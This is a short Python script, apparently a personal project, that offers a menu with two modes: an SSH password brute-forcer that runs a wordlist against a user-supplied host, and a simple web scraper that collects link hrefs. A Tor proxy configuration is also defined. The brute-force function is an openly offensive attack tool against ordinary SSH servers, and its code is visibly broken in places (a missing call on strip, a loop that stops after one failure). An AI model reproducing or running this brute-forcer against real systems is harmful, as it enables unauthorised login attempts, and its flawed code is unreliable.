#!/usr/bin/env python3


import paramiko.ssh_exception
import requests
from bs4 import BeautifulSoup as Bs
from pwn import *
import paramiko
import sys
from tqdm import tqdm ; import os
import re
PROXIE = { #Configuring the Tor Proxy.
    "http" : "socks5://127.0.0.1:9050",
    "https" : "socks5://127.0.0.1:9050"
}
testing_IfTorTrue = 'https://check.torproject.org/' #Save for later use cases.


""" Also building a simple SSH-Brut Force login Script"""



def CleanFiles():
    try:
        os.remove("contents.txt")
    except:
        return 0

def brut_force_function(host, username, attempts):
    
    with open("password.txt", "r") as strings: # Initialize the Loop 
        for password in strings:
            password = password.strip
            
            try:
                print(f"Attempting : {password}, Attempt:{attempts}")
                ssh_response = ssh(host=host, user=username, password=password,port=22, Timeout=1) #Using the Paramiko Module, instead of definying our own Concatanations.
                if ssh_response.connected():
                    print(f"Managed to Connect via [{username} - {password}].\nTook :{attempts}")
                    break

            except paramiko.ssh_exception.AuthenticationException:
                print(f"[X] Not Connecting with Password [X]")

            except Exception as z:
                print(f"Something went Wrong! Status:{z}")
            
            else:
                print("[//] No Matching Passwords founds [\\]")
                attempts += 1
                break
        

class WebScraper():
    
    def web_scraping():
        try:
            f = open('links.txt','r')
            f = f.read()
            for links in tqdm(f.split()):
                link = links # Replace with a List.
                content = requests.get(link, timeout=10)
                raw_content = content.content
                extracted = Bs(content.text, 'html.parser')
                # html = (f"{extracted}\n And also:\n{raw_content}") Uncomment for Debug
                for line in (extracted.find_all("a")):
                    with open('contents.txt', 'a') as contents:
                        contents.write(f"{line}\n")
        
        except requests.exceptions.InvalidURL:
            print(f"Invalid URL [[X]]....")
            sys.exit()
            
            

    def anchor_filter(): # Need to use REGEX to filter, write own Regex.
        i = 0
        with open("contents.txt", "r") as x: 
            contents_lenght = x.readlines()
            stored_anchors = [None] * len(contents_lenght)
            regext = r'href=\"([^"]*)' 
            for line in contents_lenght:
                stored_anchors[i] = re.findall(regext,line)
                i += 1
        CleanFiles()
        return stored_anchors 
                


if __name__ == "__main__":
    CleanFiles()
    x = input("What shall be done,\nSSH-BrutForce[1],\nWEB-Scraping[2]")
    
    match x:
        case "1":
            host = input("Enter the host: ")
            username = input("Enter the username: ")
            attempts = 0
            brut_force_function(host, username, attempts)
        case "2":
            WebScraper.web_scraping()
            for x in WebScraper.anchor_filter(): #Uncomment to get Sorted List.
                    print(x) 